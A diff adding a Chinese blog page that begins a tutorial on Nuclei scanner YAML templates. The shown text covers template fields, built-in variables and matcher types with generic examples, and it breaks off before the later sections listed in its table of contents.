@@ -1,0 +1,1477 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>认识Nuclei Yaml模板 - ev1l0o4g&#39;s blog</title><meta name="Description" content="记录生活与学习"><meta property="og:title" content="认识Nuclei Yaml模板" />
+<meta property="og:description" content="基本语法 大小写敏感：YAML对大小写敏感，这意味着键名的大小写必须精确匹配。 使用缩进表示层级关系：YAML通过缩进来表示数据的层级结构。缩进时不允许使用Tab键，只允许使用空格键。缩进的空格数目不重要，只要相同层级的元素左侧对齐即可。 注释：使用#符号表示注释，从#字符开始到行尾的内容都会被解析器忽略。 数据类型：YAML支持的数据类型包括对象（键值对的集合）、数组（一组按次序排列的值）、纯量（单个的、不可再分的值，如字符串、布尔值、整数、浮点数等）。 变量使用：YAML提供了锚点（&amp;）和引用（*）的语法，用于复用数据，避免重复定义。 复合结构：对象和数组可以结合使用，形成复合结构，如在一个YAML文件中定义多个对象或数组。 模板格式 1 2 3 4 5 6 7 8 9 10 11 12 13 id: info: name: author: severity: description: http: - raw: - | HTTP请求体 筛选与匹配 id：id不能有中文、特殊字符、&ndash;以及空格等内容，id这个参数，您可以理解为是输出的标题，一个简单易懂的ID，可以让您更快的判断出，该漏洞的大致情况：
+info：信息块，名称 、 作者 、 严重性 、 描述 、参考和 标签 ，这些都属于信息块的范围，一般情况下，我们只需要写入名称、作者、严重性、描述、标签这几项即可；
+name：模板名称，这个建议跟id相同即可；
+author：作者名称，标识版权的一种方式，但是加不加也就那样，毕竟下载后随时可以更改，也保护不了啥。
+severity：严重性，这里不可以使用中文，一般用critical、hight、Medium、info来表示威胁等级；
+description：漏洞介绍，这里可以使用中文，也不限制特殊字符，一般是用来做漏洞介绍用的，可以方便使用者了解该漏洞的具体说明；
+tags：标签，是为了给漏洞加一个标签，方便进行统一扫描，例如：tags: seeyon(切记不要用中文哈)
+在语法错误后，nuclei执行时会提示“Could not run nuclei: no templates provided for scan”，当看到该提示时，记得先排查下模板id是否存在特殊字符；
+nuclei模板内置保留字 1 2 3 4 5 6 7 8 9 10 11 12 {{Hostname}}：这是一个常用的保留字，表示主机名。 {{randstr}}：这是一个随机字符串。 {{rand_int(1,9999)}}：这是一个生成 1 到 9999 之间随机整数的保留字。 {{BaseURL}}：表示完整的基本 URL，例如 https://example." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ev1l0o4g.xyz/%E8%AE%A4%E8%AF%86nuclei-yaml%E6%A8%A1%E6%9D%BF/" /><meta property="og:image" content="https://ev1l0o4g.xyz/images/avatar.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-05-29T08:45:59+08:00" />
+<meta property="article:modified_time" content="2024-05-29T08:45:59+08:00" /><meta property="og:site_name" content="ev1l0o4g&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://ev1l0o4g.xyz/images/avatar.png"/>
+
+<meta name="twitter:title" content="认识Nuclei Yaml模板"/>
+<meta name="twitter:description" content="基本语法 大小写敏感：YAML对大小写敏感，这意味着键名的大小写必须精确匹配。 使用缩进表示层级关系：YAML通过缩进来表示数据的层级结构。缩进时不允许使用Tab键，只允许使用空格键。缩进的空格数目不重要，只要相同层级的元素左侧对齐即可。 注释：使用#符号表示注释，从#字符开始到行尾的内容都会被解析器忽略。 数据类型：YAML支持的数据类型包括对象（键值对的集合）、数组（一组按次序排列的值）、纯量（单个的、不可再分的值，如字符串、布尔值、整数、浮点数等）。 变量使用：YAML提供了锚点（&amp;）和引用（*）的语法，用于复用数据，避免重复定义。 复合结构：对象和数组可以结合使用，形成复合结构，如在一个YAML文件中定义多个对象或数组。 模板格式 1 2 3 4 5 6 7 8 9 10 11 12 13 id: info: name: author: severity: description: http: - raw: - | HTTP请求体 筛选与匹配 id：id不能有中文、特殊字符、&ndash;以及空格等内容，id这个参数，您可以理解为是输出的标题，一个简单易懂的ID，可以让您更快的判断出，该漏洞的大致情况：
+info：信息块，名称 、 作者 、 严重性 、 描述 、参考和 标签 ，这些都属于信息块的范围，一般情况下，我们只需要写入名称、作者、严重性、描述、标签这几项即可；
+name：模板名称，这个建议跟id相同即可；
+author：作者名称，标识版权的一种方式，但是加不加也就那样，毕竟下载后随时可以更改，也保护不了啥。
+severity：严重性，这里不可以使用中文，一般用critical、hight、Medium、info来表示威胁等级；
+description：漏洞介绍，这里可以使用中文，也不限制特殊字符，一般是用来做漏洞介绍用的，可以方便使用者了解该漏洞的具体说明；
+tags：标签，是为了给漏洞加一个标签，方便进行统一扫描，例如：tags: seeyon(切记不要用中文哈)
+在语法错误后，nuclei执行时会提示“Could not run nuclei: no templates provided for scan”，当看到该提示时，记得先排查下模板id是否存在特殊字符；
+nuclei模板内置保留字 1 2 3 4 5 6 7 8 9 10 11 12 {{Hostname}}：这是一个常用的保留字，表示主机名。 {{randstr}}：这是一个随机字符串。 {{rand_int(1,9999)}}：这是一个生成 1 到 9999 之间随机整数的保留字。 {{BaseURL}}：表示完整的基本 URL，例如 https://example."/>
+<meta name="twitter:site" content="@ducoduko"/>
+<meta name="application-name" content="ev1l0o4g&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ev1l0o4g&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/avatar.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://ev1l0o4g.xyz/%E8%AE%A4%E8%AF%86nuclei-yaml%E6%A8%A1%E6%9D%BF/" /><link rel="prev" href="https://ev1l0o4g.xyz/fastjson%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB%E5%BE%85%E5%86%99/" /><link rel="next" href="https://ev1l0o4g.xyz/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E7%9A%84%E7%BC%96%E5%86%99/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "认识Nuclei Yaml模板",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/ev1l0o4g.xyz\/%E8%AE%A4%E8%AF%86nuclei-yaml%E6%A8%A1%E6%9D%BF\/"
+        },"image": ["https:\/\/ev1l0o4g.xyz\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "nuclei","wordcount":  1661 ,
+        "url": "https:\/\/ev1l0o4g.xyz\/%E8%AE%A4%E8%AF%86nuclei-yaml%E6%A8%A1%E6%9D%BF\/","datePublished": "2024-05-29T08:45:59+08:00","dateModified": "2024-05-29T08:45:59+08:00","publisher": {
+            "@type": "Organization",
+            "name": "ev1l0o4g","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/ev1l0o4g.xyz\/images\/avatar.png",
+                    "width":  850 ,
+                    "height":  629 
+                }},"author": {
+                "@type": "Person",
+                "name": "ev1l0o4g"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ev1l0o4g&#39;s blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="https://mynav.ev1l0o4g.xyz/" rel="noopener noreffer" target="_blank"> 导航页 </a><a class="menu-item" href="https://ai.ev1l0o4g.xyz" rel="noopener noreffer" target="_blank"> AI </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tools/tools"> 武器库 </a><a class="menu-item" href="/friends/friends" title="Friend"> 友链 </a><a class="menu-item" href="/about/about"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ev1l0o4g&#39;s blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="https://mynav.ev1l0o4g.xyz/" title="" rel="noopener noreffer" target="_blank">导航页</a><a class="menu-item" href="https://ai.ev1l0o4g.xyz" title="" rel="noopener noreffer" target="_blank">AI</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tools/tools" title="">武器库</a><a class="menu-item" href="/friends/friends" title="Friend">友链</a><a class="menu-item" href="/about/about" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">认识Nuclei Yaml模板</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>ev1l0o4g</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%B7%A5%E5%85%B7/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>工具</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-29">2024-05-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1661 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基本语法">基本语法</a></li>
+    <li><a href="#模板格式">模板格式</a></li>
+    <li><a href="#nuclei模板内置保留字">nuclei模板内置保留字</a></li>
+    <li><a href="#匹配器matchers">匹配器——matchers</a>
+      <ul>
+        <li><a href="#匹配器类型">匹配器类型</a></li>
+        <li><a href="#匹配条件">匹配条件</a></li>
+        <li><a href="#dsl匹配器">dsl匹配器</a></li>
+        <li><a href="#负匹配器">负匹配器</a></li>
+      </ul>
+    </li>
+    <li><a href="#提取器extractors">提取器————extractors</a>
+      <ul>
+        <li><a href="#正则表达式提取器">正则表达式提取器</a></li>
+        <li><a href="#json提取器">JSON提取器</a></li>
+        <li><a href="#xpath提取器">Xpath提取器</a></li>
+        <li><a href="#kval提取器">Kval提取器</a></li>
+        <li><a href="#dsl提取器">DSL提取器</a></li>
+        <li><a href="#动态提取器">动态提取器</a></li>
+      </ul>
+    </li>
+    <li><a href="#变量">变量</a>
+      <ul>
+        <li><a href="#变量的定义与使用">变量的定义与使用</a></li>
+        <li><a href="#攻击载荷">攻击载荷</a></li>
+      </ul>
+    </li>
+    <li><a href="#可能会用到的辅助函数">可能会用到的辅助函数</a></li>
+    <li><a href="#oob测试">OOB测试</a>
+      <ul>
+        <li><a href="#interactsh-占位符">Interactsh 占位符</a></li>
+        <li><a href="#interactsh-匹配器">Interactsh 匹配器</a>
+          <ul>
+            <li><a href="#interactsh_protocol">interactsh_protocol</a></li>
+            <li><a href="#interactsh_request">interactsh_request</a></li>
+            <li><a href="#interactsh_response">interactsh_response</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#其他">其他</a>
+      <ul>
+        <li><a href="#stop-at-first-match">stop-at-first-match</a></li>
+        <li><a href="#skip-variables-check">skip-variables-check</a></li>
+        <li><a href="#嵌套表达式">嵌套表达式</a></li>
+      </ul>
+    </li>
+    <li><a href="#常见写法">常见写法</a>
+      <ul>
+        <li><a href="#文件读取">文件读取</a></li>
+        <li><a href="#sql注入">SQL注入</a>
+          <ul>
+            <li><a href="#报错注入">报错注入</a></li>
+            <li><a href="#延时注入">延时注入</a></li>
+          </ul>
+        </li>
+        <li><a href="#命令执行">命令执行</a></li>
+        <li><a href="#文件上传">文件上传</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="基本语法">基本语法</h1>
+<ol>
+<li><strong>大小写敏感</strong>：YAML对大小写敏感，这意味着键名的大小写必须精确匹配。</li>
+<li><strong>使用缩进表示层级关系</strong>：YAML通过缩进来表示数据的层级结构。缩进时不允许使用Tab键，只允许使用空格键。<strong>缩进的空格数目不重要，只要相同层级的元素左侧对齐即可</strong>。</li>
+<li><strong>注释</strong>：使用<code>#</code>符号表示注释，从<code>#</code>字符开始到行尾的内容都会被解析器忽略。</li>
+<li><strong>数据类型</strong>：YAML支持的数据类型包括对象（键值对的集合）、数组（一组按次序排列的值）、纯量（单个的、不可再分的值，如字符串、布尔值、整数、浮点数等）。</li>
+<li><strong>变量使用</strong>：YAML提供了锚点（&amp;）和引用（*）的语法，用于复用数据，避免重复定义。</li>
+<li><strong>复合结构</strong>：对象和数组可以结合使用，形成复合结构，如在一个YAML文件中定义多个对象或数组。</li>
+</ol>
+<h1 id="模板格式">模板格式</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">id</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">info</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">author</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">severity</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">description</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">http</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">raw</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="p">|</span><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">        HTTP请求体</span><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="l">筛选与匹配</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>
+<p><strong>id</strong>：id不能有中文、特殊字符、&ndash;以及空格等内容，id这个参数，您可以理解为是输出的标题，一个简单易懂的ID，可以让您更快的判断出，该漏洞的大致情况：</p>
+</li>
+<li>
+<p><strong>info</strong>：信息块，名称 、 作者 、 严重性 、 描述 、参考和 标签 ，这些都属于信息块的范围，一般情况下，我们只需要写入名称、作者、严重性、描述、标签这几项即可；</p>
+</li>
+<li>
+<p><strong>name</strong>：模板名称，这个建议跟id相同即可；</p>
+</li>
+<li>
+<p><strong>author</strong>：作者名称，标识版权的一种方式，但是加不加也就那样，毕竟下载后随时可以更改，也保护不了啥。</p>
+</li>
+<li>
+<p><strong>severity</strong>：严重性，这里不可以使用中文，一般用critical、hight、Medium、info来表示威胁等级；</p>
+</li>
+<li>
+<p><strong>description</strong>：漏洞介绍，这里可以使用中文，也不限制特殊字符，一般是用来做漏洞介绍用的，可以方便使用者了解该漏洞的具体说明；</p>
+</li>
+<li>
+<p><strong>tags</strong>：标签，是为了给漏洞加一个标签，方便进行统一扫描，例如：tags: seeyon(切记不要用中文哈)</p>
+</li>
+</ol>
+<p><strong>在语法错误后，nuclei执行时会提示“Could not run nuclei: no templates provided for scan”，当看到该提示时，记得先排查下模板id是否存在特殊字符；</strong></p>
+<h1 id="nuclei模板内置保留字">nuclei模板内置保留字</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{Hostname}}：这是一个常用的保留字，表示主机名。
+</span></span><span class="line"><span class="cl">{{randstr}}：这是一个随机字符串。
+</span></span><span class="line"><span class="cl">{{rand_int(1,9999)}}：这是一个生成 1 到 9999 之间随机整数的保留字。
+</span></span><span class="line"><span class="cl">{{BaseURL}}：表示完整的基本 URL，例如 https://example.com:443/foo/bar.php。
+</span></span><span class="line"><span class="cl">{{RootURL}}：表示不包含路径和文件的基本 URL，例如 https://example.com:443。
+</span></span><span class="line"><span class="cl">{{Host}}：表示主机名，例如 example.com。
+</span></span><span class="line"><span class="cl">{{Port}}：表示端口号，例如 443。
+</span></span><span class="line"><span class="cl">{{Path}}：表示路径，例如 /seeyon/login。
+</span></span><span class="line"><span class="cl">{{File}}：表示文件名，例如 bar.php。
+</span></span><span class="line"><span class="cl">{{Scheme}}：表示协议，例如 https。
+</span></span><span class="line"><span class="cl">{{hex_decode(&#34;&#34;)}}：这是一个十六进制解码的保留字。
+</span></span><span class="line"><span class="cl">md5()：这是一个 MD5 转换的保留字。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="匹配器matchers">匹配器——matchers</h1>
+<h2 id="匹配器类型">匹配器类型</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1、size：判断返回包大小 
+</span></span><span class="line"><span class="cl">2、word ：关键词匹配
+</span></span><span class="line"><span class="cl">3、regex ：正则表达式
+</span></span><span class="line"><span class="cl">4、binary ：要为十六进制响应匹配二进制
+</span></span><span class="line"><span class="cl">5、dsl：匹配协议响应
+</span></span><span class="line"><span class="cl">6、status：匹配状态码
+</span></span><span class="line"><span class="cl">7、xpath
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="c">#检查响应的大小是否大于1000字节</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">size</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  	</span><span class="nt">size</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  	  </span>- <span class="s2">&#34;&gt;1000&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#匹配包含 “error” 关键词的响应</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  	</span><span class="nt">word</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  	  </span>- <span class="s2">&#34;error&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#匹配响应中的版本号：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">regex</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  	</span><span class="nt">regex</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  	  </span>- <span class="s2">&#34;Version: (\\d+\\.\\d+\\.\\d+)&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#十六进制响应匹配二进制：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">binary</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">binary</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;504B0304&#34;</span><span class="w"> </span><span class="c"># zip archive</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;526172211A070100&#34;</span><span class="w"> </span><span class="c"># RAR archive version 5.0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;FD377A585A0000&#34;</span><span class="w"> </span><span class="c"># xz tar.xz archive</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l">or</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">part</span><span class="p">:</span><span class="w"> </span><span class="l">body</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c">#匹配 HTTP 响应码为 200 的情况：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">dsl</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  	</span><span class="nt">dsl</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  	  </span>- <span class="s2">&#34;response_code == 200&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="c">#匹配响应持续时间</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">dsl</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  	</span><span class="nt">dsl</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">  	  </span>- <span class="s2">&#34;duration &gt;= 4&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="匹配条件">匹配条件</h2>
+<p>往往为了降低误报率会使用多个匹配内容，此时就要用到<code>condition</code>和<code>matchers-condition</code>。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="c">#使用单个匹配器的情况：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
